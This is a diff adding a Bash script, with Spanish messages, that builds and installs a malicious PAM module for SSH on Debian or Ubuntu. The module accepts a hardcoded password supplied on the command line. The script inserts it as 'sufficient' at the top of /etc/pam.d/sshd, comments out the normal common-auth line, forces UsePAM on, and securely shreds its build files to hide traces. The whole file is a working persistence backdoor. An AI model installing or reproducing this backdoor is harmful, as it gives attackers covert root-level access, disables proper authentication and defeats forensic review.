@@ -1,0 +1,107 @@
+#!/bin/bash
+
+paquetes=("scrub")
+
+paquete_instalado_apt() {
+    dpkg -l "$1" | grep -q '^ii'
+}
+
+if [ -f /etc/os-release ]; then
+    . /etc/os-release
+    OS=$ID
+fi
+
+for paquete in "${paquetes[@]}"; do
+    if [[ "$OS" == "ubuntu" || "$OS" == "debian" ]]; then
+        if ! paquete_instalado_apt "$paquete"; then
+            sudo apt-get install -y "$paquete"
+        fi
+    fi
+done
+if [[ -z "$1" ]]; then
+    echo "[-] Error: falta argumento requerido."
+    echo ""
+    echo "Uso: $0 <contraseña>"
+    echo "Ejemplo: $0 nala"
+    echo
+    echo "[*] Después de ejecutar:"
+    echo "    - Asegúrate de iniciar sesion con tu usuario donde se ejecuto"
+    echo "    - Inicia sesión SSH con:"
+    echo "        ssh usuario@localhost"
+    echo "      y usa como contraseña: nala"
+    exit 1
+fi
+PASSWORD="$1"
+MOD_NAME="pam_verify_auth"
+SOURCE="${MOD_NAME}.c"
+OBJECT="${MOD_NAME}.o"
+MODULE="${MOD_NAME}.so"
+
+cat << 'EOF' > ${SOURCE}
+#include <security/pam_modules.h>
+#include <security/pam_appl.h>
+#include <security/pam_ext.h>
+#include <string.h>
+
+PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags,
+                                   int argc, const char **argv) {
+    (void)flags;
+    (void)argc;
+    (void)argv;
+
+    const char *password = NULL;
+    int retval = pam_get_item(pamh, PAM_AUTHTOK, (const void **)&password);
+    if (retval != PAM_SUCCESS || password == NULL) {
+        retval = pam_get_authtok(pamh, PAM_AUTHTOK, &password, "");
+        if (retval != PAM_SUCCESS || password == NULL) {
+            return PAM_AUTH_ERR;
+        }
+    }
+
+    if (strcmp(password, SECRET) != 0) {
+        return PAM_AUTH_ERR;
+    }
+
+    return PAM_SUCCESS;
+}
+
+PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags,
+                              int argc, const char **argv) {
+    (void)pamh; (void)flags; (void)argc; (void)argv;
+    return PAM_SUCCESS;
+}
+EOF
+
+PAMD_PATH="/etc/pam.d/sshd"
+SSH_CFG="/etc/ssh/sshd_config"
+DEST_DIR="/lib/x86_64-linux-gnu/security"
+
+sudo apt-get update -y
+sudo apt-get install -y gcc libpam0g-dev
+
+gcc -fPIC -c $SOURCE -o $OBJECT -Wall -Wextra -O2 -DSECRET="\"$PASSWORD\""
+gcc -shared -o $MODULE $OBJECT -lpam
+
+sudo mv $MODULE $DEST_DIR
+sudo chown root:root $DEST_DIR/$MODULE
+sudo chmod 644 $DEST_DIR/$MODULE
+
+entry="auth    sufficient    $DEST_DIR/$MODULE"
+if ! grep -qF "$MODULE" $PAMD_PATH; then
+    sudo sed -i "1i $entry" $PAMD_PATH
+fi
+
+# comenta common-auth
+sudo sed -i 's/^@include common-auth/#&/' $PAMD_PATH
+
+# asegúrate de que UsePAM esté activo
+if ! grep -qE "^\s*UsePAM\s+yes" $SSH_CFG; then
+    sudo sed -i -E 's/^\s*UsePAM\s+no/UsePAM yes/' $SSH_CFG
+    echo "UsePAM yes" | sudo tee -a $SSH_CFG >/dev/null
+fi
+
+# limpieza
+sudo scrub -f $SOURCE $OBJECT
+rm -f $SOURCE $OBJECT
+
+echo "[+] PAM module instalado. Ejecuta: sudo systemctl restart sshd"
